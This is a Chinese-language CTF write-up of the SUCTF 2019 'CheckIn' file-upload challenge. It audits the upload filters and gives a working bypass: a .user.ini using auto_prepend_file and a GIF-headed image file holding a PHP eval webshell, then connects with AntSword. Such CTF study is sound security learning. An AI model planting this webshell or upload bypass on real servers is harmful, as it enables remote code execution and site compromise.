# [SUCTF 2019]CheckIn
TAG:
## 解题过程：  
![20210108161254](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108161254.png)  
题目同时提供了源码：  
https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn  
![20210108162023](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108162023.png)  
下载下来进行代码审计,获取如下信息：  
1. 上传的所有文件可读可写可运行  
![20210108162126](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108162126.png)  
2. 不能上传含有ph和htacess字符串的文件  
![20210108162159](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108162159.png)  
3. 屏蔽掉了含有<?字符串文件的上传  
![20210108162309](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108162309.png)  
4. 使用exif_imagetype()函数进行了上传文件类型的限制  
![20210108162401](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108162401.png)  
  
总结：  
1. 无法上传php脚本文件
2. 存在文件头过滤，需要伪造图片文件头
3. 文件内容不能包含"```<?```"，使用```<script language='php'><scirpt>```类型的图片马来绕过
4. 无法上传```.htaccess```来使图片马解析，考虑上传.user.ini文件代替
  
解题步骤：  
1. 准备```.user.ini```和图片马1.jpg  
```.user.ini```:  
```
GIF89A
auto_prepend_file=1.jpg
```
  
```1.jpg```  
```
GIF89A
<script language="php">@eval($_POST['pass']);</script>
```
  
2. 分别上传  
![20210108162914](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108162914.png)  
![20210108162931](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108162931.png)  
3. 使用蚁剑连接，获得flag  
![20210108163006](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163006.png)  
![20210108163031](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163031.png)  
